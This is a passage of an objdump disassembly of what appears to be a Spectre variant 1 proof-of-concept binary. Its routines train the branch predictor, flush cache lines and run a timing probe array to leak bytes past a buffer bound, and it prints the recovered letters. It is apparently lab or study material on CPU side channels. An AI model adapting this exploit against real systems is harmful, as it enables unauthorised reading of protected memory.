 956:	48 8d 05 c3 06 20 00 	lea    0x2006c3(%rip),%rax        # 201020 <bufferSize>
 95d:	0f ae 38             	clflush (%rax)
 960:	83 45 f4 01          	addl   $0x1,-0xc(%rbp)
 964:	83 7d f4 13          	cmpl   $0x13,-0xc(%rbp)
 968:	7e 8f                	jle    8f9 <train_victim+0x11>
 96a:	0f ae e8             	lfence 
 96d:	c7 45 fc 00 00 00 00 	movl   $0x0,-0x4(%rbp)
 974:	eb 1a                	jmp    990 <train_victim+0xa8>
 976:	8b 45 fc             	mov    -0x4(%rbp),%eax
 979:	c1 e0 0c             	shl    $0xc,%eax
 97c:	48 63 d0             	movslq %eax,%rdx
 97f:	48 8d 05 ba 07 20 00 	lea    0x2007ba(%rip),%rax        # 201140 <array>
 986:	48 01 d0             	add    %rdx,%rax
 989:	0f ae 38             	clflush (%rax)
 98c:	83 45 fc 01          	addl   $0x1,-0x4(%rbp)
 990:	81 7d fc ff 00 00 00 	cmpl   $0xff,-0x4(%rbp)
 997:	7e dd                	jle    976 <train_victim+0x8e>
 999:	0f ae f0             	mfence 
 99c:	48 8d 05 7d 06 20 00 	lea    0x20067d(%rip),%rax        # 201020 <bufferSize>
 9a3:	0f ae 38             	clflush (%rax)
 9a6:	90                   	nop
 9a7:	c9                   	leaveq 
 9a8:	c3                   	retq   

00000000000009a9 <steal_byte>:
 9a9:	55                   	push   %rbp
 9aa:	48 89 e5             	mov    %rsp,%rbp
 9ad:	48 83 ec 20          	sub    $0x20,%rsp
 9b1:	48 89 7d e8          	mov    %rdi,-0x18(%rbp)
 9b5:	89 75 e4             	mov    %esi,-0x1c(%rbp)
 9b8:	c7 45 fc 00 00 00 00 	movl   $0x0,-0x4(%rbp)
 9bf:	eb 27                	jmp    9e8 <steal_byte+0x3f>
 9c1:	b8 00 00 00 00       	mov    $0x0,%eax
 9c6:	e8 1d ff ff ff       	callq  8e8 <train_victim>
 9cb:	8b 45 e4             	mov    -0x1c(%rbp),%eax
 9ce:	48 98                	cltq   
 9d0:	48 89 c7             	mov    %rax,%rdi
 9d3:	e8 58 00 00 00       	callq  a30 <victim_function>
 9d8:	48 8b 45 e8          	mov    -0x18(%rbp),%rax
 9dc:	48 89 c7             	mov    %rax,%rdi
 9df:	e8 02 fe ff ff       	callq  7e6 <find_cached_index>
 9e4:	83 45 fc 01          	addl   $0x1,-0x4(%rbp)
 9e8:	81 7d fc e7 03 00 00 	cmpl   $0x3e7,-0x4(%rbp)
 9ef:	7e d0                	jle    9c1 <steal_byte+0x18>
 9f1:	48 8b 45 e8          	mov    -0x18(%rbp),%rax
 9f5:	48 89 c7             	mov    %rax,%rdi
 9f8:	e8 62 fe ff ff       	callq  85f <find_highest_score>
 9fd:	90                   	nop
 9fe:	c9                   	leaveq 
 9ff:	c3                   	retq   

0000000000000a00 <leakByteNoinlineFunction>:
 a00:	55                   	push   %rbp
 a01:	48 89 e5             	mov    %rsp,%rbp
 a04:	89 f8                	mov    %edi,%eax
 a06:	88 45 fc             	mov    %al,-0x4(%rbp)
 a09:	0f b6 45 fc          	movzbl -0x4(%rbp),%eax
 a0d:	c1 e0 0c             	shl    $0xc,%eax
 a10:	48 63 d0             	movslq %eax,%rdx
 a13:	48 8d 05 26 07 20 00 	lea    0x200726(%rip),%rax        # 201140 <array>
 a1a:	0f b6 14 02          	movzbl (%rdx,%rax,1),%edx
 a1e:	0f b6 05 fc 06 20 00 	movzbl 0x2006fc(%rip),%eax        # 201121 <temp>
 a25:	21 d0                	and    %edx,%eax
 a27:	88 05 f4 06 20 00    	mov    %al,0x2006f4(%rip)        # 201121 <temp>
 a2d:	90                   	nop
 a2e:	5d                   	pop    %rbp
 a2f:	c3                   	retq   

0000000000000a30 <victim_function>:
 a30:	55                   	push   %rbp
 a31:	48 89 e5             	mov    %rsp,%rbp
 a34:	48 83 ec 08          	sub    $0x8,%rsp
 a38:	48 89 7d f8          	mov    %rdi,-0x8(%rbp)
 a3c:	8b 05 de 05 20 00    	mov    0x2005de(%rip),%eax        # 201020 <bufferSize>
 a42:	48 98                	cltq   
 a44:	48 39 45 f8          	cmp    %rax,-0x8(%rbp)
 a48:	73 1b                	jae    a65 <victim_function+0x35>
 a4a:	48 8d 15 ef 05 20 00 	lea    0x2005ef(%rip),%rdx        # 201040 <buffer>
 a51:	48 8b 45 f8          	mov    -0x8(%rbp),%rax
 a55:	48 01 d0             	add    %rdx,%rax
 a58:	0f b6 00             	movzbl (%rax),%eax
 a5b:	0f b6 c0             	movzbl %al,%eax
 a5e:	89 c7                	mov    %eax,%edi
 a60:	e8 9b ff ff ff       	callq  a00 <leakByteNoinlineFunction>
 a65:	90                   	nop
 a66:	c9                   	leaveq 
 a67:	c3                   	retq   
 a68:	0f 1f 84 00 00 00 00 	nopl   0x0(%rax,%rax,1)
 a6f:	00 

0000000000000a70 <__libc_csu_init>:
 a70:	41 57                	push   %r15
 a72:	41 56                	push   %r14
 a74:	49 89 d7             	mov    %rdx,%r15
 a77:	41 55                	push   %r13
 a79:	41 54                	push   %r12
 a7b:	4c 8d 25 26 03 20 00 	lea    0x200326(%rip),%r12        # 200da8 <__frame_dummy_init_array_entry>
 a82:	55                   	push   %rbp
 a83:	48 8d 2d 26 03 20 00 	lea    0x200326(%rip),%rbp        # 200db0 <__init_array_end>
 a8a:	53                   	push   %rbx
 a8b:	41 89 fd             	mov    %edi,%r13d
 a8e:	49 89 f6             	mov    %rsi,%r14
 a91:	4c 29 e5             	sub    %r12,%rbp
 a94:	48 83 ec 08          	sub    $0x8,%rsp
 a98:	48 c1 fd 03          	sar    $0x3,%rbp
 a9c:	e8 bf fa ff ff       	callq  560 <_init>
 aa1:	48 85 ed             	test   %rbp,%rbp
 aa4:	74 20                	je     ac6 <__libc_csu_init+0x56>
 aa6:	31 db                	xor    %ebx,%ebx
 aa8:	0f 1f 84 00 00 00 00 	nopl   0x0(%rax,%rax,1)
 aaf:	00 
 ab0:	4c 89 fa             	mov    %r15,%rdx
 ab3:	4c 89 f6             	mov    %r14,%rsi
 ab6:	44 89 ef             	mov    %r13d,%edi
 ab9:	41 ff 14 dc          	callq  *(%r12,%rbx,8)
 abd:	48 83 c3 01          	add    $0x1,%rbx
 ac1:	48 39 dd             	cmp    %rbx,%rbp
 ac4:	75 ea                	jne    ab0 <__libc_csu_init+0x40>
 ac6:	48 83 c4 08          	add    $0x8,%rsp
 aca:	5b                   	pop    %rbx
 acb:	5d                   	pop    %rbp
 acc:	41 5c                	pop    %r12
 ace:	41 5d                	pop    %r13
 ad0:	41 5e                	pop    %r14
 ad2:	41 5f                	pop    %r15
 ad4:	c3                   	retq   
 ad5:	90                   	nop
 ad6:	66 2e 0f 1f 84 00 00 	nopw   %cs:0x0(%rax,%rax,1)
 add:	00 00 00 

0000000000000ae0 <__libc_csu_fini>:
 ae0:	f3 c3                	repz retq 

Disassembly of section .fini:

0000000000000ae4 <_fini>:
 ae4:	48 83 ec 08          	sub    $0x8,%rsp
 ae8:	48 83 c4 08          	add    $0x8,%rsp
 aec:	c3                   	retq   

Disassembly of section .rodata:

0000000000000af0 <_IO_stdin_used>:
 af0:	01 00                	add    %eax,(%rax)
 af2:	02 00                	add    (%rax),%al
 af4:	00 00                	add    %al,(%rax)
 af6:	00 00                	add    %al,(%rax)
 af8:	4c                   	rex.WR
 af9:	65 74 74             	gs je  b70 <__GNU_EH_FRAME_HDR+0x4c>
 afc:	65 72 3a             	gs jb  b39 <__GNU_EH_FRAME_HDR+0x15>
 aff:	20 25 63 09 20 49    	and    %ah,0x49200963(%rip)        # 49201468 <_end+0x48f00328>
 b05:	6e                   	outsb  %ds:(%rsi),(%dx)
 b06:	64 65 78 3a          	fs gs js b44 <__GNU_EH_FRAME_HDR+0x20>
 b0a:	20 25 64 09 20 6e    	and    %ah,0x6e200964(%rip)        # 6e201474 <_end+0x6df00334>
 b10:	75 6d                	jne    b7f <__GNU_EH_FRAME_HDR+0x5b>
 b12:	62                   	(bad)  
 b13:	65 72 20             	gs jb  b36 <__GNU_EH_FRAME_HDR+0x12>
 b16:	6f                   	outsl  %ds:(%rsi),(%dx)
 b17:	66 20 68 69          	data16 and %ch,0x69(%rax)
 b1b:	74 73                	je     b90 <__GNU_EH_FRAME_HDR+0x6c>
 b1d:	3a                   	.byte 0x3a
 b1e:	25                   	.byte 0x25
 b1f:	64 0a 00             	or     %fs:(%rax),%al

Disassembly of section .eh_frame_hdr:

0000000000000b24 <__GNU_EH_FRAME_HDR>:
 b24:	01 1b                	add    %ebx,(%rbx)
 b26:	03 3b                	add    (%rbx),%edi
 b28:	68 00 00 00 0c       	pushq  $0xc000000
 b2d:	00 00                	add    %al,(%rax)
 b2f:	00 5c fa ff          	add    %bl,-0x1(%rdx,%rdi,8)
 b33:	ff b4 00 00 00 9c fa 	pushq  -0x5640000(%rax,%rax,1)
 b3a:	ff                   	(bad)  
 b3b:	ff                   	(bad)  
 b3c:	dc 00                	faddl  (%rax)
 b3e:	00 00                	add    %al,(%rax)
 b40:	ac                   	lods   %ds:(%rsi),%al
 b41:	fa                   	cli    
 b42:	ff                   	(bad)  
 b43:	ff 84 00 00 00 b6 fb 	incl   -0x44a0000(%rax,%rax,1)
 b4a:	ff                   	(bad)  
 b4b:	ff f4                	push   %rsp
 b4d:	00 00                	add    %al,(%rax)
 b4f:	00 c2                	add    %al,%dl
 b51:	fc                   	cld    
 b52:	ff                   	(bad)  
 b53:	ff 14 01             	callq  *(%rcx,%rax,1)
 b56:	00 00                	add    %al,(%rax)
 b58:	3b fd                	cmp    %ebp,%edi
 b5a:	ff                   	(bad)  
 b5b:	ff                   	(bad)  
 b5c:	38 01                	cmp    %al,(%rcx)
 b5e:	00 00                	add    %al,(%rax)
 b60:	c4                   	(bad)  
 b61:	fd                   	std    
 b62:	ff                   	(bad)  
 b63:	ff 58 01             	lcall  *0x1(%rax)
 b66:	00 00                	add    %al,(%rax)
 b68:	85 fe                	test   %edi,%esi
 b6a:	ff                   	(bad)  
 b6b:	ff                   	(bad)  
 b6c:	78 01                	js     b6f <__GNU_EH_FRAME_HDR+0x4b>
 b6e:	00 00                	add    %al,(%rax)
 b70:	dc fe                	fdivr  %st,%st(6)
 b72:	ff                   	(bad)  
 b73:	ff 9c 01 00 00 0c ff 	lcall  *-0xf40000(%rcx,%rax,1)
 b7a:	ff                   	(bad)  
 b7b:	ff                   	(bad)  
 b7c:	bc 01 00 00 4c       	mov    $0x4c000001,%esp
 b81:	ff                   	(bad)  
 b82:	ff                   	(bad)  
 b83:	ff                   	(bad)  
 b84:	dc 01                	faddl  (%rcx)
 b86:	00 00                	add    %al,(%rax)
 b88:	bc ff ff ff 24       	mov    $0x24ffffff,%esp
 b8d:	02 00                	add    (%rax),%al
	...

Disassembly of section .eh_frame:

0000000000000b90 <__FRAME_END__-0x1cc>:
 b90:	14 00                	adc    $0x0,%al
 b92:	00 00                	add    %al,(%rax)
 b94:	00 00                	add    %al,(%rax)
 b96:	00 00                	add    %al,(%rax)
 b98:	01 7a 52             	add    %edi,0x52(%rdx)
 b9b:	00 01                	add    %al,(%rcx)
 b9d:	78 10                	js     baf <__GNU_EH_FRAME_HDR+0x8b>
 b9f:	01 1b                	add    %ebx,(%rbx)
 ba1:	0c 07                	or     $0x7,%al
 ba3:	08 90 01 07 10 14    	or     %dl,0x14100701(%rax)
 ba9:	00 00                	add    %al,(%rax)
 bab:	00 1c 00             	add    %bl,(%rax,%rax,1)
 bae:	00 00                	add    %al,(%rax)
 bb0:	20 fa                	and    %bh,%dl
 bb2:	ff                   	(bad)  
 bb3:	ff 2b                	ljmp   *(%rbx)
	...
 bbd:	00 00                	add    %al,(%rax)
 bbf:	00 14 00             	add    %dl,(%rax,%rax,1)
 bc2:	00 00                	add    %al,(%rax)
 bc4:	00 00                	add    %al,(%rax)
 bc6:	00 00                	add    %al,(%rax)
 bc8:	01 7a 52             	add    %edi,0x52(%rdx)
 bcb:	00 01                	add    %al,(%rcx)
 bcd:	78 10                	js     bdf <__GNU_EH_FRAME_HDR+0xbb>
 bcf:	01 1b                	add    %ebx,(%rbx)
 bd1:	0c 07                	or     $0x7,%al
 bd3:	08 90 01 00 00 24    	or     %dl,0x24000001(%rax)
 bd9:	00 00                	add    %al,(%rax)
 bdb:	00 1c 00             	add    %bl,(%rax,%rax,1)
 bde:	00 00                	add    %al,(%rax)
 be0:	a0 f9 ff ff 40 00 00 	movabs 0x40fffff9,%al
 be7:	00 00 
 be9:	0e                   	(bad)  
 bea:	10 46 0e             	adc    %al,0xe(%rsi)
 bed:	18 4a 0f             	sbb    %cl,0xf(%rdx)
 bf0:	0b 77 08             	or     0x8(%rdi),%esi
 bf3:	80 00 3f             	addb   $0x3f,(%rax)
 bf6:	1a 3b                	sbb    (%rbx),%bh
 bf8:	2a 33                	sub    (%rbx),%dh
 bfa:	24 22                	and    $0x22,%al
 bfc:	00 00                	add    %al,(%rax)
 bfe:	00 00                	add    %al,(%rax)
 c00:	14 00                	adc    $0x0,%al
 c02:	00 00                	add    %al,(%rax)
 c04:	44 00 00             	add    %r8b,(%rax)
 c07:	00 b8 f9 ff ff 08    	add    %bh,0x8fffff9(%rax)
	...
 c15:	00 00                	add    %al,(%rax)
 c17:	00 1c 00             	add    %bl,(%rax,%rax,1)
 c1a:	00 00                	add    %al,(%rax)
 c1c:	5c                   	pop    %rsp
 c1d:	00 00                	add    %al,(%rax)
 c1f:	00 ba fa ff ff 0c    	add    %bh,0xcfffffa(%rdx)
 c25:	01 00                	add    %eax,(%rax)
 c27:	00 00                	add    %al,(%rax)
 c29:	41 0e                	rex.B (bad) 
 c2b:	10 86 02 43 0d 06    	adc    %al,0x60d4302(%rsi)
 c31:	03 07                	add    (%rdi),%eax
 c33:	01 0c 07             	add    %ecx,(%rdi,%rax,1)
 c36:	08 00                	or     %al,(%rax)
 c38:	20 00                	and    %al,(%rax)
 c3a:	00 00                	add    %al,(%rax)
 c3c:	7c 00                	jl     c3e <__GNU_EH_FRAME_HDR+0x11a>
 c3e:	00 00                	add    %al,(%rax)
 c40:	a6                   	cmpsb  %es:(%rdi),%ds:(%rsi)
 c41:	fb                   	sti    
 c42:	ff                   	(bad)  
 c43:	ff                   	(bad)  
 c44:	79 00                	jns    c46 <__GNU_EH_FRAME_HDR+0x122>
 c46:	00 00                	add    %al,(%rax)
 c48:	00 41 0e             	add    %al,0xe(%rcx)
 c4b:	10 86 02 43 0d 06    	adc    %al,0x60d4302(%rsi)
 c51:	41 83 03 02          	addl   $0x2,(%r11)
 c55:	73 0c                	jae    c63 <__GNU_EH_FRAME_HDR+0x13f>
 c57:	07                   	(bad)  
 c58:	08 00                	or     %al,(%rax)
 c5a:	00 00                	add    %al,(%rax)
 c5c:	1c 00                	sbb    $0x0,%al
 c5e:	00 00                	add    %al,(%rax)
 c60:	a0 00 00 00 fb fb ff 	movabs 0x89fffffbfb000000,%al
 c67:	ff 89 
 c69:	00 00                	add    %al,(%rax)
 c6b:	00 00                	add    %al,(%rax)
 c6d:	41 0e                	rex.B (bad) 
 c6f:	10 86 02 43 0d 06    	adc    %al,0x60d4302(%rsi)
 c75:	02 84 0c 07 08 00 00 	add    0x807(%rsp,%rcx,1),%al
 c7c:	1c 00                	sbb    $0x0,%al
 c7e:	00 00                	add    %al,(%rax)
 c80:	c0 00 00             	rolb   $0x0,(%rax)
 c83:	00 64 fc ff          	add    %ah,-0x1(%rsp,%rdi,8)
 c87:	ff c1                	inc    %ecx
 c89:	00 00                	add    %al,(%rax)
 c8b:	00 00                	add    %al,(%rax)
 c8d:	41 0e                	rex.B (bad) 
 c8f:	10 86 02 43 0d 06    	adc    %al,0x60d4302(%rsi)
 c95:	02 bc 0c 07 08 00 00 	add    0x807(%rsp,%rcx,1),%bh
 c9c:	20 00                	and    %al,(%rax)
 c9e:	00 00                	add    %al,(%rax)
 ca0:	e0 00                	loopne ca2 <__GNU_EH_FRAME_HDR+0x17e>
 ca2:	00 00                	add    %al,(%rax)
 ca4:	05 fd ff ff 57       	add    $0x57fffffd,%eax
 ca9:	00 00                	add    %al,(%rax)
 cab:	00 00                	add    %al,(%rax)
 cad:	41 0e                	rex.B (bad) 
 caf:	10 86 02 43 0d 06    	adc    %al,0x60d4302(%rsi)
 cb5:	02 52 0c             	add    0xc(%rdx),%dl
 cb8:	07                   	(bad)  
 cb9:	08 00                	or     %al,(%rax)
 cbb:	00 00                	add    %al,(%rax)
 cbd:	00 00                	add    %al,(%rax)
 cbf:	00 1c 00             	add    %bl,(%rax,%rax,1)
 cc2:	00 00                	add    %al,(%rax)
 cc4:	04 01                	add    $0x1,%al
 cc6:	00 00                	add    %al,(%rax)
 cc8:	38 fd                	cmp    %bh,%ch
 cca:	ff                   	(bad)  
 ccb:	ff 30                	pushq  (%rax)
 ccd:	00 00                	add    %al,(%rax)
 ccf:	00 00                	add    %al,(%rax)
 cd1:	41 0e                	rex.B (bad) 
 cd3:	10 86 02 43 0d 06    	adc    %al,0x60d4302(%rsi)
 cd9:	6b 0c 07 08          	imul   $0x8,(%rdi,%rax,1),%ecx
 cdd:	00 00                	add    %al,(%rax)
 cdf:	00 1c 00             	add    %bl,(%rax,%rax,1)
 ce2:	00 00                	add    %al,(%rax)
 ce4:	24 01                	and    $0x1,%al
 ce6:	00 00                	add    %al,(%rax)
 ce8:	48 fd                	rex.W std 
 cea:	ff                   	(bad)  
 ceb:	ff                   	(bad)  
 cec:	38 00                	cmp    %al,(%rax)
 cee:	00 00                	add    %al,(%rax)
 cf0:	00 41 0e             	add    %al,0xe(%rcx)
 cf3:	10 86 02 43 0d 06    	adc    %al,0x60d4302(%rsi)
 cf9:	73 0c                	jae    d07 <__GNU_EH_FRAME_HDR+0x1e3>
 cfb:	07                   	(bad)  
 cfc:	08 00                	or     %al,(%rax)
 cfe:	00 00                	add    %al,(%rax)
 d00:	44 00 00             	add    %r8b,(%rax)
 d03:	00 44 01 00          	add    %al,0x0(%rcx,%rax,1)
 d07:	00 68 fd             	add    %ch,-0x3(%rax)
 d0a:	ff                   	(bad)  
 d0b:	ff 65 00             	jmpq   *0x0(%rbp)
 d0e:	00 00                	add    %al,(%rax)
 d10:	00 42 0e             	add    %al,0xe(%rdx)
 d13:	10 8f 02 42 0e 18    	adc    %cl,0x180e4202(%rdi)
 d19:	8e 03                	mov    (%rbx),%es
 d1b:	45 0e                	rex.RB (bad) 
 d1d:	20 8d 04 42 0e 28    	and    %cl,0x280e4204(%rbp)
 d23:	8c 05 48 0e 30 86    	mov    %es,-0x79cff1b8(%rip)        # ffffffff86301b71 <_end+0xffffffff86000a31>
 d29:	06                   	(bad)  
 d2a:	48 0e                	rex.W (bad) 
 d2c:	38 83 07 4d 0e 40    	cmp    %al,0x400e4d07(%rbx)
 d32:	72 0e                	jb     d42 <__GNU_EH_FRAME_HDR+0x21e>
 d34:	38 41 0e             	cmp    %al,0xe(%rcx)
 d37:	30 41 0e             	xor    %al,0xe(%rcx)
 d3a:	28 42 0e             	sub    %al,0xe(%rdx)
 d3d:	20 42 0e             	and    %al,0xe(%rdx)
 d40:	18 42 0e             	sbb    %al,0xe(%rdx)
 d43:	10 42 0e             	adc    %al,0xe(%rdx)
 d46:	08 00                	or     %al,(%rax)
 d48:	10 00                	adc    %al,(%rax)
 d4a:	00 00                	add    %al,(%rax)
 d4c:	8c 01                	mov    %es,(%rcx)
 d4e:	00 00                	add    %al,(%rax)
 d50:	90                   	nop
 d51:	fd                   	std    
 d52:	ff                   	(bad)  
 d53:	ff 02                	incl   (%rdx)
 d55:	00 00                	add    %al,(%rax)
 d57:	00 00                	add    %al,(%rax)
 d59:	00 00                	add    %al,(%rax)
	...

0000000000000d5c <__FRAME_END__>:
 d5c:	00 00                	add    %al,(%rax)
	...

Disassembly of section .init_array:

0000000000200da8 <__frame_dummy_init_array_entry>:
  200da8:	d0 06                	rolb   (%rsi)
  200daa:	00 00                	add    %al,(%rax)
  200dac:	00 00                	add    %al,(%rax)
	...

Disassembly of section .fini_array:

0000000000200db0 <__do_global_dtors_aux_fini_array_entry>:
  200db0:	90                   	nop
  200db1:	06                   	(bad)  
  200db2:	00 00                	add    %al,(%rax)
  200db4:	00 00                	add    %al,(%rax)
	...

Disassembly of section .dynamic:

0000000000200db8 <_DYNAMIC>:
  200db8:	01 00                	add    %eax,(%rax)
  200dba:	00 00                	add    %al,(%rax)
  200dbc:	00 00                	add    %al,(%rax)
  200dbe:	00 00                	add    %al,(%rax)
  200dc0:	01 00                	add    %eax,(%rax)
  200dc2:	00 00                	add    %al,(%rax)
  200dc4:	00 00                	add    %al,(%rax)
  200dc6:	00 00                	add    %al,(%rax)
  200dc8:	0c 00                	or     $0x0,%al
  200dca:	00 00                	add    %al,(%rax)
  200dcc:	00 00                	add    %al,(%rax)
  200dce:	00 00                	add    %al,(%rax)
  200dd0:	60                   	(bad)  
  200dd1:	05 00 00 00 00       	add    $0x0,%eax
  200dd6:	00 00                	add    %al,(%rax)
  200dd8:	0d 00 00 00 00       	or     $0x0,%eax
  200ddd:	00 00                	add    %al,(%rax)
  200ddf:	00 e4                	add    %ah,%ah
  200de1:	0a 00                	or     (%rax),%al
  200de3:	00 00                	add    %al,(%rax)
  200de5:	00 00                	add    %al,(%rax)
  200de7:	00 19                	add    %bl,(%rcx)
  200de9:	00 00                	add    %al,(%rax)
  200deb:	00 00                	add    %al,(%rax)
  200ded:	00 00                	add    %al,(%rax)
  200def:	00 a8 0d 20 00 00    	add    %ch,0x200d(%rax)
  200df5:	00 00                	add    %al,(%rax)
  200df7:	00 1b                	add    %bl,(%rbx)
  200df9:	00 00                	add    %al,(%rax)
  200dfb:	00 00                	add    %al,(%rax)
  200dfd:	00 00                	add    %al,(%rax)
  200dff:	00 08                	add    %cl,(%rax)
  200e01:	00 00                	add    %al,(%rax)
  200e03:	00 00                	add    %al,(%rax)
  200e05:	00 00                	add    %al,(%rax)
  200e07:	00 1a                	add    %bl,(%rdx)
  200e09:	00 00                	add    %al,(%rax)
  200e0b:	00 00                	add    %al,(%rax)
  200e0d:	00 00                	add    %al,(%rax)
  200e0f:	00 b0 0d 20 00 00    	add    %dh,0x200d(%rax)
  200e15:	00 00                	add    %al,(%rax)
  200e17:	00 1c 00             	add    %bl,(%rax,%rax,1)
  200e1a:	00 00                	add    %al,(%rax)
  200e1c:	00 00                	add    %al,(%rax)
  200e1e:	00 00                	add    %al,(%rax)
  200e20:	08 00                	or     %al,(%rax)
  200e22:	00 00                	add    %al,(%rax)
  200e24:	00 00                	add    %al,(%rax)
  200e26:	00 00                	add    %al,(%rax)
  200e28:	f5                   	cmc    
  200e29:	fe                   	(bad)  
  200e2a:	ff 6f 00             	ljmp   *0x0(%rdi)
  200e2d:	00 00                	add    %al,(%rax)
  200e2f:	00 98 02 00 00 00    	add    %bl,0x2(%rax)
  200e35:	00 00                	add    %al,(%rax)
  200e37:	00 05 00 00 00 00    	add    %al,0x0(%rip)        # 200e3d <_DYNAMIC+0x85>
  200e3d:	00 00                	add    %al,(%rax)
  200e3f:	00 90 03 00 00 00    	add    %dl,0x3(%rax)
  200e45:	00 00                	add    %al,(%rax)
  200e47:	00 06                	add    %al,(%rsi)
  200e49:	00 00                	add    %al,(%rax)
  200e4b:	00 00                	add    %al,(%rax)
  200e4d:	00 00                	add    %al,(%rax)
  200e4f:	00 b8 02 00 00 00    	add    %bh,0x2(%rax)
  200e55:	00 00                	add    %al,(%rax)
  200e57:	00 0a                	add    %cl,(%rdx)
  200e59:	00 00                	add    %al,(%rax)
  200e5b:	00 00                	add    %al,(%rax)
  200e5d:	00 00                	add    %al,(%rax)
  200e5f:	00 90 00 00 00 00    	add    %dl,0x0(%rax)
  200e65:	00 00                	add    %al,(%rax)
  200e67:	00 0b                	add    %cl,(%rbx)
  200e69:	00 00                	add    %al,(%rax)
  200e6b:	00 00                	add    %al,(%rax)
  200e6d:	00 00                	add    %al,(%rax)
  200e6f:	00 18                	add    %bl,(%rax)
  200e71:	00 00                	add    %al,(%rax)
  200e73:	00 00                	add    %al,(%rax)
  200e75:	00 00                	add    %al,(%rax)
  200e77:	00 15 00 00 00 00    	add    %dl,0x0(%rip)        # 200e7d <_DYNAMIC+0xc5>
	...
  200e85:	00 00                	add    %al,(%rax)
  200e87:	00 03                	add    %al,(%rbx)
  200e89:	00 00                	add    %al,(%rax)
  200e8b:	00 00                	add    %al,(%rax)
  200e8d:	00 00                	add    %al,(%rax)
  200e8f:	00 a8 0f 20 00 00    	add    %ch,0x200f(%rax)
  200e95:	00 00                	add    %al,(%rax)
  200e97:	00 02                	add    %al,(%rdx)
  200e99:	00 00                	add    %al,(%rax)
  200e9b:	00 00                	add    %al,(%rax)
  200e9d:	00 00                	add    %al,(%rax)
  200e9f:	00 48 00             	add    %cl,0x0(%rax)
  200ea2:	00 00                	add    %al,(%rax)
  200ea4:	00 00                	add    %al,(%rax)
  200ea6:	00 00                	add    %al,(%rax)
  200ea8:	14 00                	adc    $0x0,%al
  200eaa:	00 00                	add    %al,(%rax)
  200eac:	00 00                	add    %al,(%rax)
  200eae:	00 00                	add    %al,(%rax)
  200eb0:	07                   	(bad)  
  200eb1:	00 00                	add    %al,(%rax)
  200eb3:	00 00                	add    %al,(%rax)
  200eb5:	00 00                	add    %al,(%rax)
  200eb7:	00 17                	add    %dl,(%rdi)
  200eb9:	00 00                	add    %al,(%rax)
  200ebb:	00 00                	add    %al,(%rax)
  200ebd:	00 00                	add    %al,(%rax)
  200ebf:	00 18                	add    %bl,(%rax)
  200ec1:	05 00 00 00 00       	add    $0x0,%eax
  200ec6:	00 00                	add    %al,(%rax)
  200ec8:	07                   	(bad)  
  200ec9:	00 00                	add    %al,(%rax)
  200ecb:	00 00                	add    %al,(%rax)
  200ecd:	00 00                	add    %al,(%rax)
  200ecf:	00 58 04             	add    %bl,0x4(%rax)
  200ed2:	00 00                	add    %al,(%rax)
  200ed4:	00 00                	add    %al,(%rax)
  200ed6:	00 00                	add    %al,(%rax)
  200ed8:	08 00                	or     %al,(%rax)
  200eda:	00 00                	add    %al,(%rax)
  200edc:	00 00                	add    %al,(%rax)
  200ede:	00 00                	add    %al,(%rax)
  200ee0:	c0 00 00             	rolb   $0x0,(%rax)
  200ee3:	00 00                	add    %al,(%rax)
  200ee5:	00 00                	add    %al,(%rax)
  200ee7:	00 09                	add    %cl,(%rcx)
  200ee9:	00 00                	add    %al,(%rax)
  200eeb:	00 00                	add    %al,(%rax)
  200eed:	00 00                	add    %al,(%rax)
  200eef:	00 18                	add    %bl,(%rax)
  200ef1:	00 00                	add    %al,(%rax)
  200ef3:	00 00                	add    %al,(%rax)
  200ef5:	00 00                	add    %al,(%rax)
  200ef7:	00 1e                	add    %bl,(%rsi)
  200ef9:	00 00                	add    %al,(%rax)
  200efb:	00 00                	add    %al,(%rax)
  200efd:	00 00                	add    %al,(%rax)
  200eff:	00 08                	add    %cl,(%rax)
  200f01:	00 00                	add    %al,(%rax)
  200f03:	00 00                	add    %al,(%rax)
  200f05:	00 00                	add    %al,(%rax)
  200f07:	00 fb                	add    %bh,%bl
  200f09:	ff                   	(bad)  
  200f0a:	ff 6f 00             	ljmp   *0x0(%rdi)
  200f0d:	00 00                	add    %al,(%rax)
  200f0f:	00 01                	add    %al,(%rcx)
  200f11:	00 00                	add    %al,(%rax)
  200f13:	08 00                	or     %al,(%rax)
  200f15:	00 00                	add    %al,(%rax)
  200f17:	00 fe                	add    %bh,%dh
  200f19:	ff                   	(bad)  
  200f1a:	ff 6f 00             	ljmp   *0x0(%rdi)
  200f1d:	00 00                	add    %al,(%rax)
  200f1f:	00 38                	add    %bh,(%rax)
  200f21:	04 00                	add    $0x0,%al
  200f23:	00 00                	add    %al,(%rax)
  200f25:	00 00                	add    %al,(%rax)
  200f27:	00 ff                	add    %bh,%bh
  200f29:	ff                   	(bad)  
  200f2a:	ff 6f 00             	ljmp   *0x0(%rdi)
  200f2d:	00 00                	add    %al,(%rax)
  200f2f:	00 01                	add    %al,(%rcx)
  200f31:	00 00                	add    %al,(%rax)
  200f33:	00 00                	add    %al,(%rax)
  200f35:	00 00                	add    %al,(%rax)
  200f37:	00 f0                	add    %dh,%al
  200f39:	ff                   	(bad)  
  200f3a:	ff 6f 00             	ljmp   *0x0(%rdi)
  200f3d:	00 00                	add    %al,(%rax)
  200f3f:	00 20                	add    %ah,(%rax)
  200f41:	04 00                	add    $0x0,%al
  200f43:	00 00                	add    %al,(%rax)
  200f45:	00 00                	add    %al,(%rax)
  200f47:	00 f9                	add    %bh,%cl
  200f49:	ff                   	(bad)  
  200f4a:	ff 6f 00             	ljmp   *0x0(%rdi)
  200f4d:	00 00                	add    %al,(%rax)
  200f4f:	00 03                	add    %al,(%rbx)
	...

Disassembly of section .got:

0000000000200fa8 <_GLOBAL_OFFSET_TABLE_>:
  200fa8:	b8 0d 20 00 00       	mov    $0x200d,%eax
	...
  200fbd:	00 00                	add    %al,(%rax)
  200fbf:	00 96 05 00 00 00    	add    %dl,0x5(%rsi)
  200fc5:	00 00                	add    %al,(%rax)
  200fc7:	00 a6 05 00 00 00    	add    %ah,0x5(%rsi)
  200fcd:	00 00                	add    %al,(%rax)
  200fcf:	00 b6 05 00 00 00    	add    %dh,0x5(%rsi)
	...

Disassembly of section .data:

0000000000201000 <__data_start>:
	...

0000000000201008 <__dso_handle>:
  201008:	08 10                	or     %dl,(%rax)
  20100a:	20 00                	and    %al,(%rax)
	...

0000000000201020 <bufferSize>:
  201020:	10 00                	adc    %al,(%rax)
	...

0000000000201024 <bufferSizeMask>:
  201024:	0f 00 00             	sldt   (%rax)
	...

0000000000201040 <buffer>:
  201040:	01 02                	add    %eax,(%rdx)
  201042:	03 04 05 06 07 08 09 	add    0x9080706(,%rax,1),%eax
